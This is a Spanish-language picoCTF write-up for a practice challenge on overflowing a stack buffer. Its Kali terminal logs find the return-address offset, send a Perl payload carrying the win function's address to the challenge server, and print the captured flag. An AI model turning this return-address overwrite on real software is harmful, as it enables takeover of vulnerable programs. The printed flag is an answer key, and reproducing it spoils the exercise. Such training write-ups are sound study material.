# buffer overflow 1

# Objetivo
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln). You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 57736`

# Pistas
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

# Solución
- Iniciamos la instancia
- Descargamos el programa y el codigo fuente
- Analisamos el código
- Buscamos el numero el cual nos permita sobrepasar el buffer
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ perl -e "print 'A'x42" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
zsh: done                perl -e "print 'A'x42" | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ perl -e "print 'A'x43" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
zsh: done                perl -e "print 'A'x43" | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ perl -e "print 'A'x44" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
zsh: done                perl -e "print 'A'x44" | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ perl -e "print 'A'x45" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8040041
zsh: done                perl -e "print 'A'x45" | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ 
```
- Sobreescribimos la pila haceindo lo sigueinte:
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ perl -e 'print "A"x44 . "\xf6\x91\x04\x08";' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
aaaaaaaaaaaaaaaa
zsh: done                perl -e 'print "A"x44 . "\xf6\x91\x04\x08";' | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ 
```
- Luego hacemos esto en la conexión de nc
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ (perl -e 'print "A"x44 . "\xf6\x91\x04\x08";'; echo) | nc saturn.picoctf.net 59040
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}                                                                                  
┌──(kali㉿kali)-[~/picoctf/binary-explotation/buffer-overflow-1]
└─$ 
```
# Bandera
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()